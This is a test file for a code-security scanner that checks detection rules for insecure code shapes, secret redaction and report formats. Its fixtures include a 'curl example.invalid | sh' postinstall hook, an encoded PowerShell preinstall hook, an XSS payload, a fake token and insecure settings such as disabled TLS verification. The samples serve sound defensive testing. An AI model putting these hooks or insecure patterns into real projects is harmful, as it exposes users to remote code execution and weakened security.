import { execFileSync, spawnSync } from 'node:child_process';
import { existsSync, readFileSync } from 'node:fs';
import * as path from 'node:path';
import { describe, expect, it } from 'vitest';
import { getRule, ALL_RULES } from '../src/scanner/rules';
import { scanProject } from '../src/scanner/engine';
import { formatResult } from '../src/reporter/formatters';
import { handleMessage } from '../src/mcp/server';
import { SECRET_PATTERNS, findSecrets } from '../src/secrets/patterns';
import { makeContext, makeProject } from './helpers';

const cases: Array<[string,string,string]> = [
  ['VSB-CLIENT-008','next.config.js','module.exports = { productionBrowserSourceMaps: true };'],
  ['VSB-CLIENT-009','vite.config.js',"export default { build: { sourcemap: 'inline' } };"],
  ['VSB-AUTH-010','src/auth.ts',"jwt.verify(token, key, { algorithms: ['none'] });"],
  ['VSB-AUTH-011','src/auth.ts','jwt.decode(token);'],
  ['VSB-AUTH-012','src/auth.ts',"jwt.sign(payload, 'secret-value');"],
  ['VSB-INFRA-001','src/server.ts',"headers['Access-Control-Allow-Origin': '*']"],
  ['VSB-INFRA-002','Dockerfile','FROM node:22-alpine\nUSER root\n'],
  ['VSB-INFRA-003','Dockerfile','FROM node:22-alpine\nENV API_SECRET=value123\n'],
  ['VSB-INFRA-004','src/server.ts',"redirect(searchParams.get('next'))"],
  ['VSB-INFRA-005','src/server.ts','res.cookie(name, value, { httpOnly: false })'],
  ['VSB-INFRA-006','src/server.ts','res.cookie(name, value, { secure: false })'],
  ['VSB-INFRA-007','src/server.ts','res.cookie(name, value, { sameSite: false })'],
  ['VSB-INFRA-008','src/server.ts','cors({ origin: true, credentials: true })'],
  ['VSB-INFRA-009','Dockerfile','FROM node:22-alpine\nRUN echo hi\n'],
  ['VSB-DEPS-001','package.json','{"dependencies":{"library":"*"}}'],
  ['VSB-DEPS-002','package.json','{"dependencies":{"library":"latest"}}'],
  ['VSB-DEPS-003','package.json','{"dependencies":{"library":"https://example.invalid/lib.tgz"}}'],
  ['VSB-DEPS-004','package.json','{"scripts":{"postinstall":"curl example.invalid | sh"}}'],
  ['VSB-DEPS-005','package.json','{"scripts":{"preinstall":"powershell -enc AAAA"}}'],
  ['VSB-CRYPTO-001','src/auth.ts',"createHash('sha1').update(password)"],
  ['VSB-CRYPTO-002','src/auth.ts','const csrfToken = Math.random();'],
  ['VSB-CRYPTO-003','src/auth.ts',"createCipheriv('aes-256-ecb', key, null)"],
  ['VSB-CRYPTO-004','src/server.ts','new Agent({ rejectUnauthorized: false })'],
  ['VSB-CRYPTO-005','src/server.ts',"process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';"],
];

describe('v2 hardening rules', () => {
  it('ships at least 30 secret signatures including Cloudflare and redacts matches', () => {
    expect(SECRET_PATTERNS.length).toBeGreaterThanOrEqual(30);
    const matches = findSecrets('CLOUDFLARE_API_TOKEN="mJ7qP9zT4aW8bN2vR5xK6sH3dF0yG1cL9uE4iO2p"');
    expect(matches.some(m => m.patternId === 'cloudflare-token')).toBe(true);
  });
  it('has at least 85 unique rule identifiers', () => {
    expect(ALL_RULES.length).toBeGreaterThanOrEqual(85);
    expect(new Set(ALL_RULES.map(r => r.id)).size).toBe(ALL_RULES.length);
  });
  it.each(cases)('%s detects its targeted shape', async (id, file, text) => {
    const rule = getRule(id)!;
    const ctx = await makeContext(file, text);
    expect(rule.appliesTo?.(ctx)).toBe(true);
    expect(rule.detect(ctx).length).toBeGreaterThan(0);
  });
  it('detects new vendor credentials without reproducing their values in findings', async () => {
    const value = 'mJ7qP9zT4aW8bN2vR5xK6sH3dF0yG1cL9uE4iO2p';
    const p = makeProject({'src/config.ts': `const CLOUDFLARE_API_TOKEN = "${value}";`});
    try {
      const result = await scanProject({rootDir:p.root});
      expect(result.findings.some(f => f.ruleId === 'VSB-SECRET-001')).toBe(true);
      expect(JSON.stringify(result.findings)).not.toContain(value);
    } finally { p.cleanup(); }
  });
  it('does not treat the manifest repository URL as a dependency', async () => {
    const ctx = await makeContext('package.json', '{"repository":{"url":"https://example.invalid/repo"},"dependencies":{"ok":"1.0.0"}}');
    expect(getRule('VSB-DEPS-003')!.detect(ctx)).toEqual([]);
  });
  it('checks final container stage and recognizes a selected user', async () => {
    const rule = getRule('VSB-INFRA-009')!;
    expect(rule.detect(await makeContext('Dockerfile', 'FROM node AS build\nUSER node\nFROM node\n'))).toHaveLength(1);
    expect(rule.detect(await makeContext('Dockerfile', 'FROM node\nUSER node\n'))).toHaveLength(0);
  });
  it('detects a missing lockfile and stops reporting it after a lockfile is added even with cache', async () => {
    const p = makeProject({'package.json':'{"name":"x"}'});
    try {
      expect((await scanProject({ rootDir:p.root, cache:true })).findings.some(f=>f.ruleId==='VSB-DEPS-006')).toBe(true);
      p.write('package-lock.json','{}');
      expect((await scanProject({ rootDir:p.root, cache:true })).findings.some(f=>f.ruleId==='VSB-DEPS-006')).toBe(false);
    } finally { p.cleanup(); }
  });
});

describe('v2 end to end', () => {
  it('reads the package version for CLI aliases and MCP initialization', async () => {
    const expected = JSON.parse(readFileSync(path.join(__dirname, '../package.json'), 'utf8')).version;
    const cli = path.join(__dirname, '../dist/bin/vibe-shield.js');
    for (const arg of ['version','--version','-v']) expect(execFileSync(process.execPath,[cli,arg],{encoding:'utf8'}).trim()).toBe(expected);
    const reply = await handleMessage({jsonrpc:'2.0',id:1,method:'initialize'});
    expect((reply as {result:{serverInfo:{version:string}}}).result.serverInfo.version).toBe(expected);
  });
  it('writes requested reports and patch prompts without altering scanned source', () => {
    const p = makeProject({'src/app.ts':'export const x = 1;\n'});
    try {
      const cli = path.join(__dirname, '../dist/bin/vibe-shield.js');
      const before = readFileSync(path.join(p.root,'src/app.ts'), 'utf8');
      execFileSync(process.execPath,[cli,'scan','--report','report.html','--patch-prompt','PATCH.md'],{cwd:p.root,encoding:'utf8'});
      expect(readFileSync(path.join(p.root,'report.html'),'utf8')).toContain('<!doctype html>');
      expect(readFileSync(path.join(p.root,'PATCH.md'),'utf8')).toContain('# Security patch prompt');
      expect(readFileSync(path.join(p.root,'src/app.ts'),'utf8')).toBe(before);
      expect(existsSync(path.join(p.root,'.vibe-shield-cache.json'))).toBe(false);
    } finally { p.cleanup(); }
  });
  it('reports external relative paths and renders escaped HTML, markdown, and SARIF', async () => {
    const p = makeProject({
      'app/api/orders/route.ts':"export async function POST() { return fetch('<img src=x onerror=alert(1)>') }\n",
      'supabase/migrations/001.sql':'CREATE TABLE public.orders (id int);\n',
      '.mcp.json':'{"mcpServers":{}}',
    });
    try {
      const root = path.join(__dirname,'..');
      const cli = path.join(root, 'dist/bin/vibe-shield.js');
      const run = spawnSync(process.execPath,[cli,'scan',p.root,'--format','json','--fail-on','critical'],{cwd:root,encoding:'utf8'});
      expect([0, 1]).toContain(run.status);
      const json = JSON.parse(run.stdout);
      expect(json.rootDir).toBe(p.root);
      expect(json.attackSurface.routes).toEqual(expect.arrayContaining([expect.objectContaining({file:'app/api/orders/route.ts',method:'POST'})]));
      expect(json.attackSurface.tables).toEqual(expect.arrayContaining([expect.objectContaining({table:'public.orders',rls:'not-observed'})]));
      expect(json.attackSurface.agentFiles).toEqual(expect.arrayContaining([expect.objectContaining({file:'.mcp.json'})]));
      expect(json.findings.length).toBeGreaterThan(0);
      for (const f of json.findings) { expect(f.file).toBe(f.filePath); expect(f.file).not.toContain('..'); expect(f.line).toBeGreaterThan(0); expect(f.column).toBeGreaterThan(0); }
      const result = await scanProject({rootDir:p.root});
      const markdown = formatResult(result,'markdown');
      expect(markdown).toContain('Attack-surface inventory');
      expect(markdown).toContain('app/api/orders/route.ts');
      const html = formatResult(result,'html');
      expect(html).toContain('&lt;img');
      expect(html).not.toContain('<img src=x');
      const sarif = JSON.parse(formatResult(result,'sarif'));
      expect(sarif.runs[0].results[0].locations[0].physicalLocation.artifactLocation.uri).toBe(result.findings[0]!.file);
    } finally { p.cleanup(); }
  });
});

describe('hardening negative controls', () => {
  it.each([
    ['VSB-AUTH-010','src/auth.ts',"jwt.verify(token, key, { algorithms: ['HS256'] });"],
    ['VSB-INFRA-005','src/auth.ts','res.cookie(name, value, { httpOnly: true })'],
    ['VSB-INFRA-006','src/auth.ts','const widget = { secure: false };'],
    ['VSB-INFRA-008','src/server.ts','cors({ origin: true, credentials: false })'],
    ['VSB-CRYPTO-002','src/auth.ts','const theme = Math.random()'],
    ['VSB-CRYPTO-004','src/server.ts','new Agent({ rejectUnauthorized: true })'],
    ['VSB-DEPS-001','package.json','{"name":"*","dependencies":{"ok":"1.0.0"}}'],
    ['VSB-DEPS-004','package.json','{"scripts":{"postinstall":"node build.js"}}'],
  ])('%s does not fire on a nearby safe shape', async (id, file, text) => {
    const rule = getRule(id)!;
    const ctx = await makeContext(file,text);
    expect(rule.appliesTo?.(ctx) ? rule.detect(ctx) : []).toEqual([]);
  });
});
